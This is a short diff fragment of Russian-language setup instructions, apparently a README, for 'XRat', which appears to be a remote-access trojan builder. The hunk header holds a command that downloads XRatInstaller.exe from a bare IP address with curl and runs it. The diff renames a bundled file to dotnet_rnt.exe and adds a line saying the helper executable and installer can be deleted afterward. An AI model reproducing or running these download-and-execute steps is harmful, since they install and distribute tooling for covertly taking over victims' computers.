@@ -10,8 +10,11 @@ curl -O "http://95.31.8.49:5005/download/XRatInstaller.exe" && start XRatInstall
 4. Делайте всё по инструкции в установщике
 5. После откройте папку и там будут лежать файлы
 > Builder.exe
-> dotnet.exe
+> dotnet_rnt.exe
 > XRatInstaller.exe
+
+(Потом можно удалить: > dotnet_rnt.exe и XRatInstaller.exe)
+
 6. Вам нужен только билдер
 После установки билдер откроется сам
 Обновлять также
